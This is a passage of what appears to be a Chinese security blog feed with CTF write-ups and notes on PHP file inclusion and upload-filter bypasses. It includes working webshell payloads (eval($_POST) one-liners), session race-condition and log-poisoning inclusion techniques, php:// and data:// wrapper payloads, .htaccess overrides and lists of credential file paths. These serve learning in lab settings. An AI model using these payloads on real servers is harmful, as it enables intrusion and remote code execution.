        <content type="html"><![CDATA[<p>首先代码审计，发现基本都被过滤了，但是这里可以利用 session 对话进行文件包含，通过条件竞争实现</p><p><img src="/../image/ctfshow-web82-1.png"></p><p>原理：我们在Cookie里设置 PHPSESSID&#x3D;test,php，HP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_test，但是对于默认配置 session.upload_progress.cleanup &#x3D; on，文件上传后 session 文件内容会立即被清空，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session 文件内容前，成功访问包含到该文件，实现恶意代码的命令执行。</p><hr><p>首先用html写一个文件上传框</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://79cfbdc5-5bf6-48ff-b2ef-24c4535dc377.challenge.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">session_start</span>();</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>其中value&#x3D;“xxx” 其实就是我们的 payload，这里我们写上能生成一句话木马文件的代码<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1])?&gt;&#39;);?&gt;</code>，而action&#x3D;”xxx”，即我们题目地址</p><p>打开页面，随便上传一个文件</p><p><img src="/../image/ctfshow-web82-2.png"></p><p>抓包之后放到攻击模块，然后在Cookie：添加PHPSESSID&#x3D;exp（自定义），如果没有Cookie自行添加</p><p><img src="/../image/ctfshow-web82-3.png"></p><p>接下来就是条件竞争的常规操作，无payload上传攻击和访问攻击</p><p>访问攻击地址为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-regexp">/tmp/sess</span>_exp<br></code></pre></td></tr></table></figure><p>因为Cookie 里设置了 PHPSESSID&#x3D;exp，PHP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_exp。</p><p>经过条件竞争当我们成功访问到该文件后，就会将该文件包含，竞争成功写入一句话木马</p><p>然后用蚁剑连接shell.php即可，密码为1</p><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> 做题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞总结</title>
      <link href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞概述<br>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p><p>区别如下:</p><pre><code>require():找不到被包含的文件会产生致命错误，并停止脚本运行include():找不到被包含的文件只会产生警告，脚本继续执行require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</code></pre><p>include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。比如我们上传了一个jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用</p><h2 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)</p><p>（1）使用绝对路径</p><p>使用绝对路径直接读取:</p><p>（2）使用相对路径进行读取</p><p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。</p><p>（3）一些常见的敏感目录信息路径:<br>Windows系统:</p><pre><code>C:\boot.ini //查看系统版本C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件C:\windows\repair\sam //存储Windows系统初次安装的密码C:\ProgramFiles\mysql\my.ini //Mysql配置C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码C:\windows\php.ini //php配置信息</code></pre><p>Linux&#x2F;Unix系统:</p><pre><code>/etc/password //账户信息/etc/shadow //账户密码信息/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置/usr/local/app/php5/lib/php.ini //PHP相关配置/etc/httpd/conf/httpd.conf //Apache配置文件/etc/my.conf //mysql配置文件</code></pre><h3 id="本地文件包含漏洞利用"><a href="#本地文件包含漏洞利用" class="headerlink" title="本地文件包含漏洞利用"></a>本地文件包含漏洞利用</h3><h4 id="配合文件上传使用"><a href="#配合文件上传使用" class="headerlink" title="配合文件上传使用"></a>配合文件上传使用</h4><p>比如有时我们无法绕过文件上传，不能上传webshell，可以先上传一个图片格式的webshell到服务器内，然后再利用本地文件包含漏洞去解析我们的图片格式的webshell</p><p>实例：</p><p>upload靶场pass-15</p><p><a href="https://mixbp.github.io/2025/01/22/upload/">https://mixbp.github.io/2025/01/22/upload/</a></p><h4 id="包含Apache或nginx日志文件"><a href="#包含Apache或nginx日志文件" class="headerlink" title="包含Apache或nginx日志文件"></a>包含Apache或nginx日志文件</h4><h5 id="日志介绍"><a href="#日志介绍" class="headerlink" title="日志介绍"></a>日志介绍</h5><p>日志是记录系统或应用程序运行时事件的文件。这些记录可以包括错误信息、用户活动、系统性能指标等，帮助开发者和管理员监控和排查问题。</p><p>日志通常会记录多种内容，包括：</p><pre><code>时间戳：事件发生的具体时间。用户代理（UA）头：浏览器或客户端的类型和版本。IP地址：发起请求的用户的IP地址。请求方法：如GET、POST等。请求路径：被访问的资源URL。响应状态码：服务器对请求的响应状态（如200、404等）。用户行为：如点击、表单提交等。</code></pre><h5 id="日志路径"><a href="#日志路径" class="headerlink" title="日志路径"></a>日志路径</h5><p>在Apache中，默认日志路径通常是：</p><pre><code>访问日志：/var/log/apache2/access.log（Debian/Ubuntu）错误日志：/var/log/apache2/error.log（Debian/Ubuntu）</code></pre><p>在NGINX中，默认日志路径通常是：</p><pre><code>访问日志：/var/log/nginx/access.log错误日志：/var/log/nginx/error.log</code></pre><p>具体路径可能因系统配置而异。</p><h5 id="文件上传日志包含概述"><a href="#文件上传日志包含概述" class="headerlink" title="文件上传日志包含概述"></a>文件上传日志包含概述</h5><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">步骤：</span><br><span class="language-xml">首先判断是apache服务器还是nginx服务器（抓返回包查看sever头）</span><br><span class="language-xml">上传一个正常的图片，把UA头修改为后门代码，从而将它写入日志</span><br><span class="language-xml">    上传图片，内容写入恶意代码：包含日志文件。</span><br><span class="language-xml">    利用.user.ini将图片中代码包含入upload下的php文件</span><br><span class="language-xml"></span><br><span class="language-xml">这样造成的结果就是：该php文件中就会包含日志内容，也就包含了后门代码</span><br><span class="language-xml">例如：</span><br><span class="language-xml">ctfshow-web入门文件上传-160</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">注意：这里log被过滤所以使用字符连接绕过</span><br><span class="language-xml"></span><br><span class="language-xml">也可利用日志包含写入木马 </span><br><span class="language-xml">例如：</span><br><span class="language-xml">?file=/var/log/nginx/access.log&amp;1=fputs(fopen(%27shell.php%27,%27w%27),%27</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;mixbp&quot;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">%27);</span><br><span class="language-xml"></span><br><span class="language-xml">这里ua头改为</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>实例：</p><p>ctfshow-web入门文件上传-160</p><p><a href="https://mixbp.github.io/2025/01/26/ctfshow-web160/">https://mixbp.github.io/2025/01/26/ctfshow-web160/</a></p><h4 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h4><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p><p><strong>利用条件:</strong></p><ul><li>找到Session内的可控变量</li><li>Session文件可读写，并且知道存储路径</li></ul><p>session常见存储路径:</p><pre><code>/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSIDsession文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。</code></pre><p>实例：</p><p>ctfshow-web文件包含-82</p><p><a href="https://mixbp.github.io/2025/01/29/ctfshow-web82/">https://mixbp.github.io/2025/01/29/ctfshow-web82/</a></p><h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p><p>常用方法：</p><p>1.配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p><p>2.通过条件竞争当临时文件未被删除时，包含该临时文件</p><h2 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p><p>例如：</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/phpinfo.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>源码没有对$path做任何过滤，所以存在文件包含漏洞</p><p>在远端Web服务器&#x2F;site&#x2F;目录下创建一个shell.php文件，利用漏洞去读取文件，内含一句话木马</p><p>但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。</p><p>还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">访问远端Web服务器的shell.php文件：<br><span class="hljs-number">127.0.0.1</span>/include.php?path=xxx.xxx.xxx.xx/site/shell.php?<span class="hljs-number">123123</span><br></code></pre></td></tr></table></figure><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数，需要配合文件包含使用</p><p><img src="/../image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-1.png"></p><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p><p>用法：file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p><h3 id="php-协议（fliter-input）"><a href="#php-协议（fliter-input）" class="headerlink" title="php:&#x2F;&#x2F;协议（fliter||input）"></a>php:&#x2F;&#x2F;协议（fliter||input）</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码。<br>php:&#x2F;&#x2F;input用于执行php代码。</p><p>php:&#x2F;&#x2F;filter用法：</p><p>我们利用文件包含去打开一个php文件，无法直接将代码显示在页面上，但是可以使用php:&#x2F;&#x2F;filter</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=文件路径<br><br>如果php被过滤，使用大小写混用绕过，以下伪协议都可<br>?<span class="hljs-built_in">file</span>=PhP://<span class="hljs-built_in">filter</span><br></code></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;input用法：</p><p>利用该方法可以直接写入php文件，现在url中输入?file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，在POST请求中写入php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//大小写混用绕过</span><br>?file=PhP:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure><p>发送报文，用蚁剑连接即可</p><h3 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p><pre><code>zip://中只能传入绝对路径。要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）只需要是zip的压缩包即可，后缀名可以任意更改。相同的类型还有zlib://和bzip2://</code></pre><p>zip:&#x2F;&#x2F;协议用法：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">例如：<br>zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://<span class="hljs-symbol">D</span>:\<span class="hljs-number">1.</span>zip<span class="hljs-comment">%23phpinfo.txt</span><br></code></pre></td></tr></table></figure><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p><strong>ata:&#x2F;&#x2F;</strong> 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p><p>利用data:&#x2F;&#x2F;伪协议可以达到直接执行php代码的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ，">?file=data://text/plain,&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;);?&gt;<br>?file=data://text/plain,&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;<br>//如果此处对特殊字符进行了过滤，还可以通过base64代码编码后再输入<br>data://text/plain;base64,编码后的代码<br><br>//如果此处&quot;php&quot;被过滤，可以使用大小写混用绕过<br>?file=data://text/plain,&lt;?PhP @eval($_POST[&quot;mixbp&quot;])?&gt;<br></code></pre></td></tr></table></figure><h3 id="伪协议利用条件和方法"><a href="#伪协议利用条件和方法" class="headerlink" title="伪协议利用条件和方法"></a>伪协议利用条件和方法</h3><p><img src="/../image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-2.png"></p><p>详解地址：<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p><h2 id="java环境下的伪协议利用"><a href="#java环境下的伪协议利用" class="headerlink" title="java环境下的伪协议利用"></a>java环境下的伪协议利用</h2><p><strong>jar: 伪协议</strong></p><ul><li>原理：jar: 伪协议可以用来访问 JAR 文件中的资源。在一些存在文件包含或资源加载漏洞的 Java 应用中，可以利用该伪协议来获取 JAR 文件中的源码。</li><li>假设存在一个 Java 应用，通过 URLClassLoader 加载外部资源，攻击者可以构造如下 URL：</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">jar:<span class="hljs-keyword">file</span>:<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/your.jar!/</span>com<span class="hljs-regexp">/example/Y</span>ourClass.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><ul><li>解释：</li><li>jar: 是伪协议名称。</li><li>file:&#x2F;path&#x2F;to&#x2F;your.jar 指定 JAR 文件的路径。</li><li>!&#x2F;com&#x2F;example&#x2F;YourClass.class 指定 JAR 文件中要访问的具体类文件。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ctfshow]web160</title>
      <link href="/2025/01/26/ctfshow-web160/"/>
      <url>/2025/01/26/ctfshow-web160/</url>
      
        <content type="html"><![CDATA[<p><img src="/../image/ctfshow-web160-1.png"></p><p>经过测试发现这题禁用了很多字符,&#96;&#96;{}()[];，查了之后才知道这题涉及到了日志包含。</p><p>步骤：</p><p>首先上传我们的.user.ini文件，写上<code>auto_prepend_file=mixbp.png</code>，这可以让我们的mixbp.png内的代码包含进upload文件夹下的php文件，但是这里会有前端验证，直接上传是不行的先改后缀.png，然后抓包后修改</p><p><img src="/../image/ctfshow-web160-2.png"></p><p>上传成功，还可在重放器中查看返回包，发现服务器为nginx</p><p><img src="/../image/ctfshow-web160-3.png"></p><p>接着上传我们的mixbp.png文件里面写了日志包含代码，注意这里的log被过滤了所以使用字符拼接绕过<code>&lt;=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code>，</p><p><img src="/../image/ctfshow-web160-4.png"></p><p>然后我们访问upload下的index.php文件并拦截请求，修改ua头</p><p><img src="/../image/ctfshow-web160-5.png"></p><p>然后使用get传参?1&#x3D;system(“tac ..&#x2F;flag.php”);即可得到flag，（这里使用伪协议直接读取也行）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">system(<span class="hljs-string">&quot;tac ../flag.php&quot;</span>)<span class="hljs-comment">; 时，程序将：</span><br><br>访问父目录中的 flag.php 文件。<br>以反向顺序打印该文件的内容到控制台<br></code></pre></td></tr></table></figure><p><img src="/../image/ctfshow-web160-6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 做题笔记 </tag>
            
            <tag> 日志包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf极客大挑战upload</title>
      <link href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"/>
      <url>/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/</url>
      
        <content type="html"><![CDATA[<p><img src="/../image/buuctf-upload-1.png"></p><p>打开发现是一个文件上传，这里直接试试上传我们的一句话木马，显示</p><p><img src="/../image/buuctf-upload-2.png"></p><p>我们抓个包看看，能抓到包，说明在后端验证，我们修改content-type为image&#x2F;jpeg试试，显示</p><p><img src="/../image/buuctf-upload-3.png"></p><p>php环境可以尝试的后缀还有php1,php2,php3,php4,php5,phtmI,pht，我们这里试试，发现phtml可以用但是又给我们显示</p><p><img src="/../image/buuctf-upload-4.png"></p><p>也就是说过滤掉了&lt;?，所以可以用不含&lt;?的一句话木马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;mixbp&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还是不行</p><p><img src="/../image/buuctf-upload-5.png"></p><p>猜测这里应该是对图片头进行了校验，在我们的一句话木马前添加图片头GIF89a，添加三个占位符然后使用hex修改也可</p><p><img src="/../image/buuctf-upload-6.png"></p><p>上传成功</p><p><img src="/../image/buuctf-upload-7.png"></p><p>用蚁剑连接，终端输入cat&#x2F;flag即可</p><p><img src="/../image/buuctf-upload-8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 做题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload</title>
      <link href="/2025/01/22/upload/"/>
      <url>/2025/01/22/upload/</url>
      
        <content type="html"><![CDATA[<p><img src="/../image/upload-0.png"></p><h2 id="pass-01-js绕过"><a href="#pass-01-js绕过" class="headerlink" title="pass-01-js绕过"></a>pass-01-js绕过</h2><p><img src="/../image/upload-pass01-1.png"></p><p><img src="/../image/upload-pass01-2.png"></p><p>发现如果文件是php格式，会被拦截，且抓包抓不到东西，所以判断是前端js拦截</p><p>将文件格式改为jpg然后上传，并抓包</p><p><img src="/../image/upload-pass01-3.png"><img src="/../image/upload-pass01-4.png"></p><p>这样就绕过前端验证了</p><p>拦截后将格式修改回php并放包</p><p><img src="/../image/upload-pass01-5.png"></p><p>发现已经上传成功了，使用蚁剑连接试试</p><p><img src="/../image/upload-pass01-6.png"></p><p>右键复制图片链接并在蚁剑中测试连接出现连接成功</p><p><img src="/../image/upload-pass01-7.png"></p><p>第二种方法：</p><p>直接在浏览器中禁用所有js代码</p><p>先打开开发者工具，然后点击右上角设置按钮</p><p><img src="/../image/upload-pass01-8.png"></p><p>停用javascript然后直接上传php文件即可</p><p><img src="/../image/upload-pass01-9.png"></p><p>第三种方法：</p><p>检查前端js代码</p><p>查看代码发现上传表单绑定了一个js</p><p><img src="/../image/upload-pass01-10.png"></p><p>js代码</p><p><img src="/../image/upload-pass01-11.png"></p><p>直接修改return true即可</p><p><img src="/../image/upload-pass01-12.png"></p><h2 id="pass-02-content-type绕过"><a href="#pass-02-content-type绕过" class="headerlink" title="pass-02-content-type绕过"></a>pass-02-content-type绕过</h2><p><img src="/../image/upload-pass02-1.png"></p><p>同样上传php文件，显示文件类型不正确，请重新上传，并且可以抓到包，所以判断验证是在后端进行的</p><p><img src="/../image/upload-pass02-2.png"></p><p>用bp抓包并把文件类型改为image&#x2F;jpeg</p><p><img src="/../image/upload-pass02-3.png"></p><p>上传成功</p><p><img src="/../image/upload-pass02-4.png"></p><h2 id="pass-03-特殊后缀绕过"><a href="#pass-03-特殊后缀绕过" class="headerlink" title="pass-03-特殊后缀绕过"></a>pass-03-特殊后缀绕过</h2><p>直接上传php文件，发现能够抓到包，所以判断验证是在后端进行的</p><p><img src="/../image/upload-pass03-1.png"></p><p>在传入php文件时，发现它提示不允许上传这些后缀文件传.asp,.aspx,.php,.jsp后缀文件,检查源码也发现这些</p><p>php环境可以尝试的后缀还有php1,php2,php3,php4,php5,phtmI,pht</p><p>直接抓包然后直接把php后缀名改为php3</p><p><img src="/../image/upload-pass03-2.png"></p><p>上传成功</p><p><img src="/../image/upload-pass03-3.png"></p><p>但是这里用蚁剑无法连接，说是Apache服务器不对php3以php格式解析，要修改配置文件。</p><h2 id="pass-04-htaccess绕过"><a href="#pass-04-htaccess绕过" class="headerlink" title="pass-04-.htaccess绕过"></a>pass-04-.htaccess绕过</h2><p><img src="/../image/upload-pass04-1.png"></p><p>先修改配置文件</p><p>通过源码和提示发现这关基本禁止了一切可以被解析的php文件</p><p><img src="/../image/upload-pass04-2.png"></p><p>但是.htaccess后缀没有被禁止，所以先写一下要上传的.htaccess配置文件</p><p>新建一个配置文件然后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x-httpd-php .jpg .txt<br><br><br>这个也行<br>&lt;FilesMatch <span class="hljs-string">&#x27;mixbp.jpg&#x27;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>意思是能够将.jpg和.txt格式文件按php格式解析</p><p><img src="/../image/upload-pass04-3.png"></p><p>然后先上传.htaccess文件再上传jpg格式的php文件（内含一句话木马）</p><p>然后就能用蚁剑连接了</p><h2 id="pass-05-user-ini绕过"><a href="#pass-05-user-ini绕过" class="headerlink" title="pass-05-.user.ini绕过"></a>pass-05-.user.ini绕过</h2><p>前置知识</p><p><img src="/../image/upload-pass05-1.png"></p><p><img 